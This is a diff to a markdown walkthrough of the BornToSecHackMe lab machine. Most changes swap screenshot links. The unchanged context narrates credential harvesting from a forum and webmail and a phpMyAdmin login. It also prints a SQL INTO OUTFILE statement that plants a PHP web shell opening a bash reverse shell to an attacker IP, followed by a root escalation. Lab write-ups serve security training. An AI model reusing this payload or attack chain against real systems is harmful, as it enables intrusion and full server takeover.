@@ -90,7 +90,8 @@ root@debian:/home/yoyo# dirb https://10.13.100.236/
 
 In this URL, https://10.13.100.236/forum/, I found a forum page titled "HackMe," which displays a few discussion threads, with only four registered users. The topics include "Welcome to this new Forum!", "Probleme login?", "Gasolina," and "Les mouettes!
 
-![Screen Shot 2024-10-19 at 11.48.13 PM.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/6f2fde31-9543-4e4c-9330-82632d6d36e1/894814eb-9113-4ac2-b1b7-e0bd897b5eb8/Screen_Shot_2024-10-19_at_11.48.13_PM.png)
+<img width="872" alt="Screen Shot 2024-10-19 at 11 48 13 PM" src="https://github.com/user-attachments/assets/83e8589d-dab2-4086-9893-49687b2e3606" />
+
 
 I tried to navigate to "Probleme login" and found a password: https://10.13.100.236/forum/index.php?id=6
 
@@ -102,17 +103,19 @@ Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Received disconnect from 161.202.39.3
 
 Then, I logged in with the username `lmezard` and the password `!q\]Ej?*5K5cy*AJ`.
 
-![Screen Shot 2024-10-20 at 12.00.32 AM.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/6f2fde31-9543-4e4c-9330-82632d6d36e1/90d9c76c-47bd-4154-a5cd-0140efdc6fe4/Screen_Shot_2024-10-20_at_12.00.32_AM.png)
+<img width="796" alt="Screen Shot 2024-10-20 at 12 00 32 AM" src="https://github.com/user-attachments/assets/29ae97db-b57c-42ef-bbe1-d80cf2d6bda5" />
 
 I found the email address `laurie@borntosec.net` in this form.
 
 ---
 
-![Screen Shot 2024-10-20 at 12.03.36 AM.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/6f2fde31-9543-4e4c-9330-82632d6d36e1/db3ccddf-950b-48ff-80c2-4b71568281b5/Screen_Shot_2024-10-20_at_12.03.36_AM.png)
+<img width="831" alt="Screen Shot 2024-10-20 at 12 03 36 AM" src="https://github.com/user-attachments/assets/c9848bda-f7fb-4e6a-be91-caa86cb2f2f7" />
+
 
 Now I have the email address `laurie@borntosec.net` and the password `!q\]Ej?*5K5cy*AJ`. Let's try to log in to the email box. https://10.13.100.236/webmail/
 
-![Screen Shot 2024-10-20 at 12.08.53 AM.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/6f2fde31-9543-4e4c-9330-82632d6d36e1/9b3f1156-00f1-48dc-a756-775526a63be4/Screen_Shot_2024-10-20_at_12.08.53_AM.png)
+<img width="826" alt="Screen Shot 2024-10-20 at 12 08 53 AM" src="https://github.com/user-attachments/assets/879382f1-f359-47a6-9af6-59d16d4ccf9a" />
+
 
 I found an email message that contains the username and password for the database:
 
@@ -130,7 +133,8 @@ Then, I logged into the database with the username `root` and the password `Fg-'
 
 https://10.13.100.236/phpmyadmin/
 
-![Screen Shot 2024-10-20 at 12.15.26 AM.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/6f2fde31-9543-4e4c-9330-82632d6d36e1/a1a8b105-d752-48fd-a2c2-c1d3e4bcb450/Screen_Shot_2024-10-20_at_12.15.26_AM.png)
+<img width="923" alt="Screen Shot 2024-10-20 at 12 15 26 AM" src="https://github.com/user-attachments/assets/2a557bd6-ce86-482e-a6e9-211f52f4e04a" />
+
 
 ## SQL injection
 
@@ -139,8 +143,7 @@ After logging into the database, I ran an SQL query (SQL injection) to create a 
 ```sql
 SELECT '<?php system("bash -c \'exec bash -i &>/dev/tcp/10.13.100.96/4444 <&1\'"); ?>' INTO OUTFILE '/var/www/forum/templates_c/reverse_shell.php.php';
 ```
-
-![Screen Shot 2024-10-20 at 12.33.33 AM.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/6f2fde31-9543-4e4c-9330-82632d6d36e1/a52784d6-2b04-415e-9f16-a3b3558ed586/Screen_Shot_2024-10-20_at_12.33.33_AM.png)
+<img width="1186" alt="Screen Shot 2024-10-20 at 12 33 33 AM" src="https://github.com/user-attachments/assets/3926edc4-531d-40d2-8b6d-9636c8fae7b8" />
 
 The SQL statement used in a SQL injection attack to create a web shell on a vulnerable server.
 
@@ -228,7 +231,7 @@ python -c 'import pty; pty.spawn("/bin/bash")'
 Switch to the root user using the `su` command:
 
 ```jsx
-www-data@BornToSecHackMe:/var/www/forum/templates_c$ su root
-Password: yoyo
+www-data@BornToSecHackMe:/var/www/forum/templates_c$ su yo-root
+Password: yopass
 root@BornToSecHackMe:~#
 ```
